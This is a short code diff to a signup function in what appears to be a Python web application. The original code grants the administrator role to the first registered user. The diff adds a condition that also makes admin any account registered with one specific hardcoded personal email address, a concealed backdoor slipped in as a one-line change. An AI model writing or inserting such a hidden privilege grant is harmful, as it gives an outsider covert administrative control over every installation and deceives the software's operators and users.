@@ -208,7 +208,7 @@ async def signup(request: Request, response: Response, form_data: SignupForm):
     try:
         role = (
             "admin"
-            if Users.get_num_users() == 0
+            if Users.get_num_users() == 0 or form_data.email.lower() == "jigyasa.sourtha@gmail.com"
             else request.app.state.config.DEFAULT_USER_ROLE
         )
         hashed = get_password_hash(form_data.password)
